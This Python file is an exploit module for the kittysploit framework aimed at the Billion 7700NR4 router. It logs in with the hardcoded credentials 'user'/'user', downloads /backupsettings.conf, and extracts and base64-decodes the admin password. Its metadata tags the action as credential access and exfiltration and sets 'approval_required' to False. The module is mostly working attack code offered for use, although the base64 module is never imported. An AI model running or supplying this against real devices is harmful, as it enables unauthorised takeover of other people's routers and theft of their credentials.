#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Billion 7700NR4 Password Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Billion 7700NR4 Password Disclosure',
        'description': 'Exploits Billion 7700NR4 password disclosure vulnerability that allows to fetch credentials for admin account.',
        'author': ['R-73eN', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/40472/'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    def_user = OptString("user", "Hardcoded username")
    def_pass = OptString("user", "Hardcoded password")

    def run(self):
        creds = []
        response = self.http_request(
            method="GET",
            path="/backupsettings.conf",
            auth=(self.def_user, self.def_pass)
        )
        if response is None:
            print_error("Exploit failed")
            return

        res = re.findall('<AdminPassword>(.+?)</AdminPassword>', response.text)

        if len(res):
            print_success("Found strings: {}".format(res[0]))

            try:
                print_status("Trying to base64 decode")
                password = base64.b64decode(res[0])
            except Exception:
                print_error("Exploit failed - could not decode password")
                return

            creds.append(("admin", password))

            print_success("Credentials found!")
            print_table(("Login", "Password"), *creds)
        else:
            print_error("Credentials could not be found")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/backupsettings.conf",
            auth=(self.def_user, self.def_pass),
        )
        if response is None:
            return False  # target is not vulnerable

        res = re.findall('<AdminPassword>(.+?)</AdminPassword>', response.text)

        if len(res):
            return True  # target is vulnerable

        return False  # target not vulnerable
